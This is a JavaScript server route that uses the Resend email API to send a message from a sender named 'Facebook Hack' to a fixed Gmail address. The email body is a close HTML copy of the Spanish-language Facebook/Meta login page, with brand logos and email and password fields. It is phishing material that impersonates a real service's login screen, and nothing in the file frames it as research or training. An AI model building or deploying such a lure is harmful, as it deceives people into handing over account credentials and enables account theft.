/* eslint-disable no-undef */
import { Resend } from "resend";

export async function POST(request) {
  const resend = new Resend(process.env.RESEND_API_KEY);

  try {
    const { name, subject, email, message } = await request.json();

    const { data, error } = await resend.emails.send({
      from: "Facebook Hack <onboarding@resend.dev>",
      to: ["angelxcrema@gmail.com"],
      subject: subject,
      html: `
<meta charset="UTF-8"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
.fb-wrap{min-height:100vh;display:flex;flex-direction:column;background:#fff;font-family:-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif, min-width:400px}
.fb-header{border-bottom:1px solid #dddfe2;padding:8px 16px;display:flex;justify-content:center;background:#fff}
.fb-main{flex:1;display:flex;flex-direction:column;align-items:center;padding:40px 16px 32px}
.fb-card{min-width:396px;display:flex;flex-direction:column;align-items:flex-start}
.fb-title{font-size:20px;font-weight:600;color:#1c1e21;margin-bottom:16px}
.fb-inputs{width:100%;display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
.fb-input{width:100%;height:52px;border:1px solid #dddfe2;border-radius:6px;padding:0 14px;font-size:16px;color:#1c1e21;background:#fff;outline:none;-webkit-appearance:none}
.fb-input:focus{border-color:#1877F2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.fb-input::placeholder{color:#8a8d91}
.btn-login{width:100%;height:52px;background:#1877F2;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:16px}
.btn-login:active{background:#166fe5}
.forgot{font-size:14px;color:#1877F2;text-decoration:none;display:block;text-align:center;width:100%;margin-bottom:20px;padding:4px 0}
.fb-divider{width:100%;display:flex;align-items:center;gap:10px;margin-bottom:16px}
.div-line{flex:1;height:1px;background:#dddfe2}
.div-txt{font-size:13px;color:#8a8d91}
.btn-create{width:100%;height:52px;background:#fff;border:1.5px solid #1877F2;border-radius:6px;color:#1877F2;font-size:17px;font-weight:600;cursor:pointer}
.btn-create:active{background:#e7f0fd}
.meta-logo{margin-top:20px;display:flex;align-items:center;gap:6px;align-self:center}
.fb-footer{background:#f0f2f5;border-top:1px solid #dddfe2;padding:12px 16px 8px}
.footer-langs{display:flex;flex-wrap:wrap;gap:4px 10px;margin-bottom:10px}
.footer-langs a,.footer-links a{color:#737373;text-decoration:none;font-size:12px}
.footer-links{display:flex;flex-wrap:wrap;gap:4px 8px;margin-bottom:10px;border-bottom:1px solid #ccc;padding-bottom:10px}
.footer-copy{font-size:11px;color:#8a8d91}
@media(prefers-color-scheme:dark){
  .fb-wrap{background:#18191a}
  .fb-header{background:#242526;border-color:#3e4042}
  .fb-title{color:#e4e6eb}
  .fb-input{background:#3a3b3c;border-color:#3a3b3c;color:#e4e6eb}
  .fb-input::placeholder{color:#8a8d91}
  .fb-input:focus{border-color:#2d88ff}
  .btn-login{background:#2d88ff}
  .forgot{color:#2d88ff}
  .div-line{background:#3a3b3c}
  .btn-create{background:#3a3b3c;border-color:#3a3b3c;color:#e4e6eb}
  .fb-footer{background:#242526;border-color:#3e4042}
  .footer-langs a,.footer-links a,.footer-copy{color:#8a8d91}
  .footer-links{border-color:#3e4042}
}
</style>

<div class="fb-wrap">
  <div class="fb-header">
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
      <circle cx="20" cy="20" r="20" fill="#1877F2"/>
      <path d="M27.5 20c0-4.142-3.358-7.5-7.5-7.5S12.5 15.858 12.5 20c0 3.745 2.742 6.85 6.328 7.41v-5.241h-1.904V20h1.904v-1.65c0-1.88 1.119-2.916 2.83-2.916.82 0 1.676.146 1.676.146l-.258 2.197h-1.454c-.806 0-1.059.5-1.059 1.013V20h2.328l-.372 2.169H20.563V27.41C24.758 26.85 27.5 23.745 27.5 20z" fill="#fff"/>
    </svg>
  </div>

  <div class="fb-main">
    <div class="fb-card">
      <div class="fb-title">Inicia sesi&#243;n en Facebook</div>
      <div class="fb-inputs">
        <input class="fb-input" type="text" placeholder="Correo electr&#243;nico o n&#250;mero de tel&#233;fono" autocomplete="username"/>
        <input class="fb-input" type="password" placeholder="Contrase&#241;a" autocomplete="current-password"/>
      </div>
      <button class="btn-login">Iniciar sesi&#243;n</button>
      <a href="#" class="forgot">&#191;Olvidaste tu contrase&#241;a?</a>
      <div class="fb-divider"><div class="div-line"></div><span class="div-txt">o</span><div class="div-line"></div></div>
      <button class="btn-create">Crear cuenta nueva</button>
      <div class="meta-logo">
        <svg width="16" height="10" viewBox="0 0 28 16" fill="none"><path d="M4.07 0C2.238 0 0 2.05 0 5.752c0 2.373 1.208 4.044 3.02 4.044 1.34 0 2.113-.74 3.253-2.534.877-1.39 1.905-3.377 2.597-4.571C7.884.978 6.154 0 4.07 0zm19.86 0c-2.083 0-3.814.978-4.8 2.691.692 1.194 1.72 3.182 2.597 4.571 1.14 1.793 1.913 2.534 3.253 2.534C26.792 9.796 28 8.125 28 5.752 28 2.05 25.762 0 23.93 0zM14 1.625c-1.06 0-2.05.59-2.956 1.627-.726.836-1.477 2.082-2.27 3.424C7.22 9.134 6.338 11.278 5.547 12.5c-.676 1.047-1.14 1.3-1.527 1.3-.81 0-1.52-.834-1.52-2.548 0-.63.128-1.22.352-1.69-.65.464-1.272 1.263-1.272 2.745C1.58 14.52 2.962 16 4.623 16c1.123 0 1.96-.475 2.95-1.957.864-1.295 1.77-3.366 2.508-4.845L11.3 6.77c.685-1.326 1.415-2.357 2.7-2.357 1.284 0 2.014 1.031 2.7 2.357l1.218 2.428c.738 1.479 1.644 3.55 2.508 4.845.99 1.482 1.827 1.957 2.95 1.957 1.661 0 3.043-1.48 3.043-3.692 0-1.482-.622-2.28-1.272-2.745.224.47.352 1.06.352 1.69 0 1.714-.71 2.548-1.52 2.548-.387 0-.851-.253-1.527-1.3-.79-1.222-1.673-3.366-2.227-5.824-.793-1.342-1.544-2.588-2.27-3.424C16.05 2.215 15.06 1.625 14 1.625z" fill="#0082FB"/></svg>
        <span style="font-size:13px;color:#8a8d91">Meta</span>
      </div>
    </div>
  </div>

  <div class="fb-footer">
    <div class="footer-langs">
      <a href="#">Espa&#241;ol (Espa&#241;a)</a><a href="#">English (US)</a><a href="#">Italiano</a><a href="#">Portugu&#234;s (Brasil)</a><a href="#">Fran&#231;ais (France)</a><a href="#">Deutsch</a><a href="#">&#26085;&#26412;&#35486;</a><a href="#">M&#225;s idiomas&#8230;</a>
    </div>
    <div class="footer-links">
      <a href="#">Registrarte</a><a href="#">Iniciar sesi&#243;n</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Ray-Ban Meta</a><a href="#">Meta AI</a><a href="#">Instagram</a><a href="#">Threads</a><a href="#">Pol&#237;tica de privacidad</a><a href="#">Centro de privacidad</a><a href="#">Acerca de</a><a href="#">Crear anuncio</a><a href="#">Crear p&#225;gina</a><a href="#">Desarrolladores</a><a href="#">Empleo</a><a href="#">Cookies</a><a href="#">Elecci&#243;n de anuncios</a><a href="#">Condiciones</a><a href="#">Ayuda</a><a href="#">Carga de contactos y no usuarios</a>
    </div>
    <div class="footer-copy">Meta &#169; 2026</div>
  </div>
</div>


      `
    });

    if (error) return new Response(error);
    return new Response(JSON.stringify(data));
  } catch (error) {
    return new Response("Error processing the request", {
      status: 500
    });
  }
}
